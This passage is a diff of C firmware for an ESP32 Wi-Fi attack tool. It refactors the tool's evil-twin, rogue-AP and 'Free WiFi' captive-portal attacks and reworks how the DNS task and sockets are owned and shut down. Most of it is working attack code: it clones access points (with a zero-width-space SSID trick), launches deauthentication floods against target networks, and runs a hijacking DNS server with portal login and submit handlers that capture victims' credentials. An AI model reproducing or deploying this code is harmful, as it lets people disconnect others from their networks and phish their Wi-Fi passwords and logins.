- * never silently clobbers a utility service. No query registered => never refuse. */
-/* >>> CYM_AP_ADMIT_TYPES_BEGIN (extracted verbatim by tests/run_ap_admit_host.py) */
-typedef enum { AP_ADMIT_OK = 0, AP_ADMIT_REFUSE_UTILITY } ap_admit_t;
-/* <<< CYM_AP_ADMIT_TYPES_END */
-static bool (*s_utility_ap_cb)(void) = NULL;
-void wifi_attacks_set_utility_ap_cb(bool (*cb)(void)) { s_utility_ap_cb = cb; }
-
-static ap_admit_t ap_admit(int brings_up_ap, int utility_ap_owned, int handoff) {
-    if (brings_up_ap && utility_ap_owned && !handoff) return AP_ADMIT_REFUSE_UTILITY;
-    return AP_ADMIT_OK;
+/* Event callbacks admitted before stop are drained before deauth/radio reuse. */
+static void evil_twin_event_handler(void *arg, esp_event_base_t base, int32_t id, void *data) {
+    portENTER_CRITICAL(&s_ap_spin);
+    bool admit = __atomic_load_n(&portal_active, __ATOMIC_ACQUIRE);
+    if (admit) ++ap_event_inflight;
+    portEXIT_CRITICAL(&s_ap_spin);
+    if (!admit) return;
+    evil_twin_event_handler_impl(arg, base, id, data);
+    portENTER_CRITICAL(&s_ap_spin);
+    --ap_event_inflight;
+    portEXIT_CRITICAL(&s_ap_spin);
 }
-static int ap_utility_owned(void) { return s_utility_ap_cb ? (s_utility_ap_cb() ? 1 : 0) : 0; }
 
 esp_err_t wifi_attacks_start_evil_twin(const char *ssid, const char *password) {
-    if (strlen(ssid) == 0) {
-        ESP_LOGE(TAG, "SSID cannot be empty");
-        return ESP_ERR_INVALID_ARG;
-    }
-    if (ap_admit(1, ap_utility_owned(), 0) != AP_ADMIT_OK) {
-        ESP_LOGW(TAG, "Evil Twin refused: a utility AP (NTP/file server) owns the interface");
-        return ESP_ERR_INVALID_STATE;
-    }
-    
-    // Only set karma_mode to false if not already in Karma mode
-    // (wifi_attacks_start_portal sets it to true before calling this)
-    if (!karma_mode) {
-        ESP_LOGI(TAG, "Starting Evil Twin: %s", ssid);
-    }
-    
-    strncpy(evilTwinSSID, ssid, 32);
-    evilTwinSSID[32] = '\0';
-    
-    if (password) {
-        strncpy(evilTwinPassword, password, 63);
-        evilTwinPassword[63] = '\0';
-    } else {
-        evilTwinPassword[0] = '\0';
-    }
-    
-    // Reset password verification flag
-    last_password_wrong = false;
-    connectAttemptCount = 0;
-    
-    // Get or create AP netif (like ensure_ap_mode in original)
-    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-    if (!ap_netif) {
-        // AP netif doesn't exist - need to stop WiFi, create it, and restart
-        ESP_LOGI(TAG, "Creating AP netif...");
-        esp_wifi_stop();
-        ap_netif = esp_netif_create_default_wifi_ap();
-        if (!ap_netif) {
-            ESP_LOGE(TAG, "Failed to create AP netif");
-            esp_wifi_start();
-            apply_wifi_power_settings();
-            return ESP_FAIL;
-        }
-        esp_wifi_set_mode(WIFI_MODE_APSTA);
-        esp_wifi_start();
-        apply_wifi_power_settings();
-        vTaskDelay(pdMS_TO_TICKS(500));
-    } else {
-        // AP netif exists - ensure we're in APSTA mode for raw frame transmission
-        wifi_mode_t mode;
-        esp_wifi_get_mode(&mode);
-        if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
-            ESP_LOGI(TAG, "Switching WiFi to APSTA mode for Evil Twin");
-            esp_wifi_set_mode(WIFI_MODE_APSTA);
-            vTaskDelay(pdMS_TO_TICKS(100));
-        }
-    }
-    
-    // Stop DHCP server to configure custom IP
-    /* DHCP stop/set/start is checked below as one transaction. */
-    
-    // Set static IP 172.0.0.1 for AP
-    esp_netif_ip_info_t ip_info;
-    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
-    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
-    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
-    
-    esp_err_t ret = cym_dhcp_server_configure(ap_netif, &ip_info);
-    if (ret != ESP_OK) {
-        ESP_LOGW(TAG, "AP DHCP configuration failed: %s", esp_err_to_name(ret));
-        return ret;
-    }
-    
-    // Configure AP with Evil Twin SSID (with Zero Width Space)
-    wifi_config_t ap_config = {
-                .ap = {
-                    .ssid = "",
-                    .ssid_len = 0,
-                    .channel = 1,
-                    .password = "",
-                    .max_connection = 4,
-                    .authmode = WIFI_AUTH_OPEN
-                }
-    };
-    size_t ssid_len = strlen(evilTwinSSID);
-    
-    // Add Zero Width Space (UTF-8: 0xE2 0x80 0x8B) to prevent iPhone grouping
-    if (ssid_len + 3 <= sizeof(ap_config.ap.ssid)) {
-        memcpy(ap_config.ap.ssid, evilTwinSSID, ssid_len);
-        ap_config.ap.ssid[ssid_len] = 0xE2;
-        ap_config.ap.ssid[ssid_len + 1] = 0x80;
-        ap_config.ap.ssid[ssid_len + 2] = 0x8B;
-        ap_config.ap.ssid_len = ssid_len + 3;
-    } else {
-        // SSID too long, just copy without Zero Width Space
-        strncpy((char *)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
-        ap_config.ap.ssid_len = ssid_len;
-    }
-    
-    if (strlen(evilTwinPassword) > 0) {
-        strcpy((char *)ap_config.ap.password, evilTwinPassword);
-        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
-    } else {
-        ap_config.ap.authmode = WIFI_AUTH_OPEN;
-    }
-
-    // Set AP config (mode is already APSTA from netif creation or init)
-    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
-    
-    // Register event handler for password verification (WIFI_EVENT_STA_CONNECTED/DISCONNECTED)
-    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &evil_twin_event_handler, NULL);
-    
-    // Start DHCP server
-    ret = ESP_OK; /* already started and verified by cym_dhcp_server_configure */
-    if (ret != ESP_OK) {
-        ESP_LOGW(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
-    }
-    
-    vTaskDelay(pdMS_TO_TICKS(1000)); // Wait for AP to stabilize
-    
-    ESP_LOGI(TAG, "Evil Twin AP active: %s", evilTwinSSID);
-    stats_clients_connected = 0;
-    
-    // Start captive portal services and deauth workflow
-    ESP_LOGI(TAG, "Captive portal started on 172.0.0.1");
-    start_portal_services();
-    
-    // Emit portal deployed event
-    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
-    
-    wifi_scanner_save_target_bssids();
-    wifi_attacks_start_deauth();
-
-    // Emit deauth started event
-    emit_evil_twin_event(EVIL_TWIN_EVENT_DEAUTH_STARTED, evilTwinSSID, NULL);
-
-    // Package B: register this attack-owned AP so it can be suspended/resumed.
-    wifi_attacks_ap_record_owner(AP_REQ_EVIL_TWIN, evilTwinSSID, evilTwinPassword, NULL, 0, 0);
-    return ESP_OK;
+    return ap_request_start(AP_REQ_EVIL_TWIN, ssid, password, NULL, 0);
 }
 
 esp_err_t wifi_attacks_stop_evil_twin(void) {
-    // Only stop if portal is actually active
-    if (!portal_active) {
-        return ESP_OK;
-    }
-    
-    ESP_LOGI(TAG, "Stopping Evil Twin attack...");
-    
-    // Stop deauth attack first
-    wifi_attacks_stop_deauth();
-    
-    // Reset Karma mode
-    karma_mode = false;
-    
-    esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &evil_twin_event_handler);
-    
-    // Stop captive portal services if running
-    stop_portal_services();
-    
-    esp_wifi_stop();
-    esp_wifi_set_mode(WIFI_MODE_APSTA);
-    esp_wifi_start();
-    apply_wifi_power_settings();
-
-    ESP_LOGI(TAG, "Evil Twin stopped");
-    return ESP_OK;
+    wifi_attacks_ap_invalidate();
+    return ESP_OK; /* cancellation accepted, use owner state for completion */
 }
 
 // ============================================================================
@@ -1984,9 +1923,9 @@ static esp_err_t captive_detection_handler(httpd_req_t *req) {
 
 static esp_err_t start_portal_services(void)
 {
-    if (portal_active) {
-        ESP_LOGW(TAG, "Portal already active");
-        return ESP_OK;
+    if (portal_active || portal_server || dns_server_task_handle) {
+        ESP_LOGW(TAG, "Portal resources already owned");
+        return ESP_ERR_INVALID_STATE;
     }
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.server_port = 80;
@@ -1994,137 +1933,134 @@ static esp_err_t start_portal_services(void)
     config.max_uri_handlers = 16;  // Increase from default 8 to support all captive portal endpoints
     config.lru_purge_enable = true;
     
-    if (httpd_start(&portal_server, &config) == ESP_OK) {
+    esp_err_t rc = httpd_start(&portal_server, &config);
+    if (rc == ESP_OK) {
         // Root handler
         httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = portal_root_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &root);
+        rc = httpd_register_uri_handler(portal_server, &root);
+        if (rc != ESP_OK) goto failed;
         
         // Portal page handler
         httpd_uri_t portal_uri = { .uri = "/portal", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &portal_uri);
+        rc = httpd_register_uri_handler(portal_server, &portal_uri);
+        if (rc != ESP_OK) goto failed;
         
         // Login handler (POST /login)
         httpd_uri_t login = { .uri = "/login", .method = HTTP_POST, .handler = portal_submit_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &login);
+        rc = httpd_register_uri_handler(portal_server, &login);
+        if (rc != ESP_OK) goto failed;
         
         // Submit handler (legacy POST /submit)
         httpd_uri_t submit = { .uri = "/submit", .method = HTTP_POST, .handler = portal_submit_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &submit);
+        rc = httpd_register_uri_handler(portal_server, &submit);
+        if (rc != ESP_OK) goto failed;
         
         // GET handler for query strings
         httpd_uri_t get_uri = { .uri = "/get", .method = HTTP_GET, .handler = get_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &get_uri);
+        rc = httpd_register_uri_handler(portal_server, &get_uri);
+        if (rc != ESP_OK) goto failed;
         
         // Save handler (POST /save)
         httpd_uri_t save_uri = { .uri = "/save", .method = HTTP_POST, .handler = save_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &save_uri);
+        rc = httpd_register_uri_handler(portal_server, &save_uri);
+        if (rc != ESP_OK) goto failed;
         
         // Android captive portal detection
         httpd_uri_t gen204 = { .uri = "/generate_204", .method = HTTP_GET, .handler = portal_generate_204_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &gen204);
+        rc = httpd_register_uri_handler(portal_server, &gen204);
+        if (rc != ESP_OK) goto failed;
         
         // iOS captive portal detection
         httpd_uri_t hotspot = { .uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = portal_hotspot_detect_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &hotspot);
+        rc = httpd_register_uri_handler(portal_server, &hotspot);
+        if (rc != ESP_OK) goto failed;
         
         // Samsung captive portal detection
         httpd_uri_t samsung = { .uri = "/ncsi.txt", .method = HTTP_GET, .handler = captive_detection_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &samsung);
+        rc = httpd_register_uri_handler(portal_server, &samsung);
+        if (rc != ESP_OK) goto failed;
         
         // Windows captive portal detection
         httpd_uri_t windows = { .uri = "/connecttest.txt", .method = HTTP_GET, .handler = captive_detection_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &windows);
+        rc = httpd_register_uri_handler(portal_server, &windows);
+        if (rc != ESP_OK) goto failed;
         
         // RFC 8908 Captive Portal API
         httpd_uri_t api = { .uri = "/captive-portal/api", .method = HTTP_GET, .handler = captive_api_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &api);
+        rc = httpd_register_uri_handler(portal_server, &api);
+        if (rc != ESP_OK) goto failed;
         
         // Catch-all handler for all other requests (MUST be last)
         httpd_uri_t catchall = { .uri = "/*", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL };
-        httpd_register_uri_handler(portal_server, &catchall);
+        rc = httpd_register_uri_handler(portal_server, &catchall);
+        if (rc != ESP_OK) goto failed;
         
         ESP_LOGI(TAG, "HTTP server started with all captive portal endpoints");
     } else {
         ESP_LOGE(TAG, "Failed to start HTTP server");
-        return ESP_FAIL;
+        return rc;
     }
-    // Set portal_active BEFORE creating DNS task to avoid race condition
-    portal_active = true;
+    /* Bind/timeout readiness is established BEFORE task creation. The task owns
+     * the fd after successful creation; on create failure only this caller owns it. */
+    dns_server_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (dns_server_socket < 0) { rc = ESP_FAIL; goto failed; }
+    struct sockaddr_in addr = { .sin_family = AF_INET,
+        .sin_addr.s_addr = htonl(INADDR_ANY), .sin_port = htons(DNS_PORT) };
+    struct timeval timeout = { .tv_sec = 1 };
+    if (bind(dns_server_socket, (struct sockaddr *)&addr, sizeof(addr)) < 0 ||
+        setsockopt(dns_server_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
+        close(dns_server_socket); dns_server_socket = -1; rc = ESP_FAIL; goto failed;
+    }
+    __atomic_store_n(&dns_exited, false, __ATOMIC_RELEASE);
+    __atomic_store_n(&dns_run, true, __ATOMIC_RELEASE);
+    if (xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5, &dns_server_task_handle) != pdPASS) {
+        close(dns_server_socket); dns_server_socket = -1;
+        __atomic_store_n(&dns_exited, true, __ATOMIC_RELEASE);
+        __atomic_store_n(&dns_run, false, __ATOMIC_RELEASE);
+        rc = ESP_ERR_NO_MEM; goto failed;
+    }
+    /* Worker blocks on this notification until its task handle is published. */
+    xTaskNotifyGive(dns_server_task_handle);
+    __atomic_store_n(&portal_active, true, __ATOMIC_RELEASE);
     connectAttemptCount = 0;
-    xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5, &dns_server_task_handle);
-    ESP_LOGI(TAG, "Captive portal started");
     return ESP_OK;
+failed:
+    /* stop preserves still-owned handles on uncertain release. Caller records
+     * the first acquisition error, and separately fails closed on cleanup. */
+    stop_portal_services();
+    return rc;
 }
 
-static void stop_portal_services(void)
+static esp_err_t stop_portal_services(void)
 {
-    if (!portal_active) return;
-    // Package B (#6) DNS socket ownership: signal the DNS task to exit via the flag
-    // and let it close its OWN socket (single owner) instead of closing the socket
-    // here first. The task's recvfrom has a 1s SO_RCVTIMEO, so it observes the flag
-    // and exits within ~1s; this removes the stop-path-vs-task double-close of a
-    // descriptor that could have been reused.
-    portal_active = false;
-    int wait_count = 0;
-    while (dns_server_task_handle != NULL && wait_count < 50) {
+    __atomic_store_n(&portal_active, false, __ATOMIC_RELEASE);
+    __atomic_store_n(&dns_run, false, __ATOMIC_RELEASE);
+    for (int i = 0; dns_server_task_handle && !__atomic_load_n(&dns_exited, __ATOMIC_ACQUIRE) && i < 50; ++i)
         vTaskDelay(pdMS_TO_TICKS(100));
-        wait_count++;
-    }
-    // Safety net only: if the task never ran/closed it (e.g. task-create failed),
-    // close the still-open descriptor here. Normal exit leaves it already -1.
-    if (dns_server_socket >= 0) {
-        close(dns_server_socket);
-        dns_server_socket = -1;
-    }
+    /* Timeout never closes a live task's descriptor or forgets its context. */
+    if (dns_server_task_handle && !__atomic_load_n(&dns_exited, __ATOMIC_ACQUIRE)) return ESP_ERR_TIMEOUT;
+    dns_server_task_handle = NULL;
     if (portal_server) {
-        httpd_stop(portal_server);
+        esp_err_t rc = httpd_stop(portal_server);
+        if (rc != ESP_OK) return rc;
         portal_server = NULL;
     }
+    return ESP_OK;
 }
 
 static void dns_server_task(void *pvParameters) {
     (void)pvParameters;
     
-    struct sockaddr_in server_addr;
     struct sockaddr_in client_addr;
     socklen_t client_addr_len = sizeof(client_addr);
     char rx_buffer[DNS_MAX_PACKET_SIZE];
     char tx_buffer[DNS_MAX_PACKET_SIZE];
     
-    // Create UDP socket
-    dns_server_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (dns_server_socket < 0) {
-        ESP_LOGE(TAG, "Failed to create DNS socket: %d", errno);
-        dns_server_task_handle = NULL;
-        vTaskDelete(NULL);
-        return;
-    }
-    
-    // Bind to DNS port 53
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
-    server_addr.sin_port = htons(DNS_PORT);
-    
-    int err = bind(dns_server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
-    if (err < 0) {
-        ESP_LOGE(TAG, "Failed to bind DNS socket: %d", errno);
-        close(dns_server_socket);
-        dns_server_socket = -1;
-        dns_server_task_handle = NULL;
-        vTaskDelete(NULL);
-        return;
-    }
-    
-    // Set socket timeout so we can check portal_active flag periodically
-    struct timeval timeout;
-    timeout.tv_sec = 1;
-    timeout.tv_usec = 0;
-    setsockopt(dns_server_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
-    
+    ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
+    const int fd = dns_server_socket; /* single lifetime owner after publication */
     // Main DNS server loop
-    while (portal_active) {
-        int len = recvfrom(dns_server_socket, rx_buffer, sizeof(rx_buffer), 0,
+    while (__atomic_load_n(&dns_run, __ATOMIC_ACQUIRE)) {
+        int len = recvfrom(fd, rx_buffer, sizeof(rx_buffer), 0,
                           (struct sockaddr *)&client_addr, &client_addr_len);
         
         if (len < 0) {
@@ -2210,259 +2146,30 @@ static void dns_server_task(void *pvParameters) {
             tx_buffer[answer_pos++] = 1;
             
             // Send response (silently)
-            sendto(dns_server_socket, tx_buffer, answer_pos, 0,
+            sendto(fd, tx_buffer, answer_pos, 0,
                   (struct sockaddr *)&client_addr, client_addr_len);
         }
     }
     
     // Clean up
-    close(dns_server_socket);
+    close(fd);
     dns_server_socket = -1;
-    dns_server_task_handle = NULL;
+    __atomic_store_n(&dns_exited, true, __ATOMIC_RELEASE); /* final shared context access */
     vTaskDelete(NULL);
 }
 
 esp_err_t wifi_attacks_start_portal(const char *ssid) {
-    const char *portal_ssid = ssid ? ssid : "Free WiFi";
-    ESP_LOGI(TAG, "Starting captive portal: %s", portal_ssid);
-    if (ap_admit(1, ap_utility_owned(), 0) != AP_ADMIT_OK) {
-        ESP_LOGW(TAG, "Portal refused: a utility AP (NTP/file server) owns the interface");
-        return ESP_ERR_INVALID_STATE;
-    }
-    
-    // Store SSID for logging purposes
-    strncpy(evilTwinSSID, portal_ssid, 32);
-    evilTwinSSID[32] = '\0';
-    
-    // Enable Karma mode - no WiFi connection verification attempts
-    karma_mode = true;
-    
-    // Get or create AP netif (like ensure_ap_mode in original)
-    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-    if (!ap_netif) {
-        // AP netif doesn't exist - need to stop WiFi, create it, and restart
-        ESP_LOGI(TAG, "Creating AP netif...");
-        esp_wifi_stop();
-        ap_netif = esp_netif_create_default_wifi_ap();
-        if (!ap_netif) {
-            ESP_LOGE(TAG, "Failed to create AP netif");
-            esp_wifi_start();
-            apply_wifi_power_settings();
-            return ESP_FAIL;
-        }
-        esp_wifi_set_mode(WIFI_MODE_APSTA);
-        esp_wifi_start();
-        apply_wifi_power_settings();
-        vTaskDelay(pdMS_TO_TICKS(500));
-    } else {
-        // AP netif exists - ensure we're in APSTA mode
-        wifi_mode_t mode;
-        esp_wifi_get_mode(&mode);
-        if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
-            ESP_LOGI(TAG, "Switching WiFi to APSTA mode for Portal");
-            esp_wifi_set_mode(WIFI_MODE_APSTA);
-            vTaskDelay(pdMS_TO_TICKS(100));
-        }
-    }
-    
-    // Stop DHCP server to configure custom IP
-    /* DHCP stop/set/start is checked below as one transaction. */
-    
-    // Set static IP 172.0.0.1 for AP
-    esp_netif_ip_info_t ip_info;
-    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
-    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
-    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
-    
-    esp_err_t ret = cym_dhcp_server_configure(ap_netif, &ip_info);
-    if (ret != ESP_OK) {
-        ESP_LOGW(TAG, "AP DHCP configuration failed: %s", esp_err_to_name(ret));
-        return ret;
-    }
-    
-    // Configure AP with portal SSID (no Zero Width Space - this is not Evil Twin)
-    wifi_config_t ap_config = {
-        .ap = {
-            .ssid = "",
-            .ssid_len = 0,
-            .channel = 1,
-            .password = "",
-            .max_connection = 4,
-            .authmode = WIFI_AUTH_OPEN
-        }
-    };
-    size_t ssid_len = strlen(portal_ssid);
-    memcpy(ap_config.ap.ssid, portal_ssid, ssid_len);
-    ap_config.ap.ssid_len = ssid_len;
-    
-    // Set AP config (mode is already APSTA from ensure or from Evil Twin's init)
-    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
-    
-    // Start DHCP server
-    ret = ESP_OK; /* already started and verified by cym_dhcp_server_configure */
-    if (ret != ESP_OK) {
-        ESP_LOGW(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
-    }
-    
-    vTaskDelay(pdMS_TO_TICKS(1000)); // Wait for AP to stabilize
-    
-    ESP_LOGI(TAG, "Portal AP active: %s", portal_ssid);
-    stats_clients_connected = 0;
-    
-    // Register event handler for client connect/disconnect notifications
-    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_event_handler, NULL);
-    
-    // Start captive portal services (HTTP + DNS) - NO deauth!
-    ESP_LOGI(TAG, "Captive portal started on 172.0.0.1");
-    start_portal_services();
-    
-    // Emit portal deployed event
-    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
-
-    // Package B: register this attack-owned AP so it can be suspended/resumed.
-    wifi_attacks_ap_record_owner(AP_REQ_PORTAL, portal_ssid, NULL, NULL, 0, 0);
-    return ESP_OK;
+    return ap_request_start(AP_REQ_PORTAL, ssid ? ssid : "Free WiFi", NULL, NULL, 0);
 }
 
 esp_err_t wifi_attacks_start_rogue_ap(const char *ssid, const char *password,
                                      const uint8_t *target_bssid, uint8_t channel) {
-    if (!ssid || !password) {
-        ESP_LOGE(TAG, "Rogue AP requires both SSID and password");
-        return ESP_ERR_INVALID_ARG;
-    }
-    if (ap_admit(1, ap_utility_owned(), 0) != AP_ADMIT_OK) {
-        ESP_LOGW(TAG, "Rogue AP refused: a utility AP (NTP/file server) owns the interface");
-        return ESP_ERR_INVALID_STATE;
-    }
-
-    ESP_LOGI(TAG, "Starting Rogue AP: %s (ch %d)", ssid, channel);
-    
-    strncpy(evilTwinSSID, ssid, 32);
-    evilTwinSSID[32] = '\0';
-    
-    karma_mode = true;
-    
-    esp_wifi_disconnect();
-    vTaskDelay(pdMS_TO_TICKS(200));
-    
-    // Use APSTA mode so we can send raw deauth frames via WIFI_IF_AP
-    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-    if (!ap_netif) {
-        ESP_LOGI(TAG, "Creating AP netif for Rogue AP...");
-        esp_wifi_stop();
-        ap_netif = esp_netif_create_default_wifi_ap();
-        if (!ap_netif) {
-            ESP_LOGE(TAG, "Failed to create AP netif");
-            esp_wifi_start();
-            apply_wifi_power_settings();
-            return ESP_FAIL;
-        }
-        esp_wifi_set_mode(WIFI_MODE_APSTA);
-        esp_wifi_start();
-        apply_wifi_power_settings();
-        vTaskDelay(pdMS_TO_TICKS(500));
-    } else {
-        wifi_mode_t mode;
-        esp_wifi_get_mode(&mode);
-        if (mode != WIFI_MODE_APSTA) {
-            esp_wifi_set_mode(WIFI_MODE_APSTA);
-            vTaskDelay(pdMS_TO_TICKS(100));
-        }
-    }
-    
-    /* DHCP stop/set/start is checked below as one transaction. */
-    
-    esp_netif_ip_info_t ip_info;
-    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
-    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
-    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
-    
-    esp_err_t ret = cym_dhcp_server_configure(ap_netif, &ip_info);
-    if (ret != ESP_OK) {
-        ESP_LOGW(TAG, "AP DHCP configuration failed: %s", esp_err_to_name(ret));
-        return ret;
-    }
-    
-    wifi_config_t ap_config = {
-        .ap = {
-            .ssid = "",
-            .ssid_len = 0,
-            .channel = channel > 0 ? channel : 1,
-            .password = "",
-            .max_connection = 4,
-            .authmode = WIFI_AUTH_WPA2_PSK,
-        }
-    };
-    size_t ssid_len = strlen(ssid);
-    memcpy(ap_config.ap.ssid, ssid, ssid_len);
-    ap_config.ap.ssid_len = ssid_len;
-    strncpy((char *)ap_config.ap.password, password, sizeof(ap_config.ap.password) - 1);
-    
-    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
-    
-    ret = ESP_OK; /* already started and verified by cym_dhcp_server_configure */
-    if (ret != ESP_OK) {
-        ESP_LOGW(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
-    }
-    
-    vTaskDelay(pdMS_TO_TICKS(1000));
-    
-    ESP_LOGI(TAG, "Rogue AP active: %s (WPA2, ch %d)", ssid, channel);
-    stats_clients_connected = 0;
-    
-    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_event_handler, NULL);
-    
-    ESP_LOGI(TAG, "Rogue AP captive portal started on 172.0.0.1");
-    start_portal_services();
-    
-    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
-    
-    // Start broadcast deauth to the target BSSID (same as Evil Twin)
-    if (target_bssid) {
-        wifi_scanner_save_target_bssids();
-        wifi_attacks_start_deauth();
-        emit_evil_twin_event(EVIL_TWIN_EVENT_DEAUTH_STARTED, evilTwinSSID, NULL);
-        ESP_LOGI(TAG, "Rogue AP deauth started against %02X:%02X:%02X:%02X:%02X:%02X",
-                 target_bssid[0], target_bssid[1], target_bssid[2],
-                 target_bssid[3], target_bssid[4], target_bssid[5]);
-    }
-
-    // Package B: register this attack-owned AP so it can be suspended/resumed.
-    wifi_attacks_ap_record_owner(AP_REQ_ROGUE, ssid, password, target_bssid, channel,
-                                 target_bssid ? 1 : 0);
-    return ESP_OK;
+    return ap_request_start(AP_REQ_ROGUE, ssid, password, target_bssid, channel);
 }
 
 esp_err_t wifi_attacks_stop_portal(void) {
-    // Only stop if portal is actually active
-    if (!portal_active) {
-        return ESP_OK;
-    }
-    
-    ESP_LOGI(TAG, "Stopping captive portal...");
-    
-    // Stop deauth if running (Rogue AP starts deauth alongside portal)
-    if (deauth_attack_active) {
-        wifi_attacks_stop_deauth();
-    }
-    
-    // Unregister portal event handler
-    esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_event_handler);
-    
-    // Reset Karma mode
-    karma_mode = false;
-    
-    // Stop captive portal services (HTTP + DNS)
-    stop_portal_services();
-    
-    // Restore WiFi to normal mode
-    esp_wifi_stop();
-    esp_wifi_set_mode(WIFI_MODE_APSTA);
-    esp_wifi_start();
-    apply_wifi_power_settings();
-
-    ESP_LOGI(TAG, "Captive portal stopped");
-    return ESP_OK;
+    wifi_attacks_ap_invalidate();
+    return ESP_OK; /* cancellation accepted, use owner state for completion */
 }
 
 bool wifi_attacks_is_portal_active(void) {
@@ -2476,6 +2183,135 @@ void wifi_attacks_set_karma_mode(bool enable) {
     } else {
         ESP_LOGI(TAG, "Karma mode disabled (Evil Twin mode)");
     }
+}
+
+/* Owned start is called only by ap_owner_worker under the retained physical
+ * reservation. Public start returns admission only; generation is unchanged. */
+static esp_err_t ap_start_owned(const ap_req_snapshot_t *snap) {
+    esp_err_t rc;
+    if (deauth_attack_task_handle) return ESP_ERR_INVALID_STATE;
+    wifi_mode_t mode;
+    rc = esp_wifi_get_mode(&mode);
+    if (rc != ESP_OK) return rc;
+    wifi_ap_record_t sta;
+    rc = esp_wifi_sta_get_ap_info(&sta);
+    if (rc == ESP_OK) return ESP_ERR_INVALID_STATE; /* do not clobber a live STA */
+    if (rc != ESP_ERR_WIFI_NOT_CONNECT) return rc;
+    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    s_apctx->radio_touched = true; /* any following failure requires checked unwind */
+    if (!netif) {
+        rc = esp_wifi_stop();
+        if (rc != ESP_OK && rc != ESP_ERR_WIFI_NOT_STARTED) return rc;
+        netif = esp_netif_create_default_wifi_ap();
+        if (!netif) return ESP_ERR_NO_MEM;
+    }
+    rc = esp_wifi_set_mode(WIFI_MODE_APSTA);
+    if (rc != ESP_OK) return rc;
+    wifi_config_t config = { .ap = { .channel = snap->channel ? snap->channel : 1,
+        .max_connection = 4, .authmode = WIFI_AUTH_OPEN } };
+    size_t len = strlen(snap->ssid);
+    memcpy(config.ap.ssid, snap->ssid, len);
+    if (snap->kind == AP_REQ_EVIL_TWIN && len + 3 <= sizeof(config.ap.ssid)) {
+        memcpy(config.ap.ssid + len, "\xe2\x80\x8b", 3); len += 3;
+    }
+    config.ap.ssid_len = len;
+    if (snap->pass[0]) {
+        memcpy(config.ap.password, snap->pass, strlen(snap->pass) + 1);
+        config.ap.authmode = WIFI_AUTH_WPA2_PSK;
+    }
+    /* SDK validates target/country/band and WPA2 constraints. Never continue
+     * after rejected set_config merely because get_mode later says APSTA. */
+    wifi_country_t country;
+    rc = esp_wifi_get_country(&country);
+    if (rc != ESP_OK) return rc;
+    if (config.ap.channel <= 14 && (config.ap.channel < country.schan ||
+        config.ap.channel >= (unsigned)country.schan + country.nchan)) return ESP_ERR_INVALID_ARG;
+#if !CONFIG_BOARD_HAS_5GHZ
+    if (config.ap.channel > 14) return ESP_ERR_NOT_SUPPORTED;
+#endif
+    rc = esp_wifi_set_config(WIFI_IF_AP, &config);
+    if (rc != ESP_OK) return rc;
+    wifi_config_t admitted;
+    rc = esp_wifi_get_config(WIFI_IF_AP, &admitted);
+    if (rc != ESP_OK) return rc;
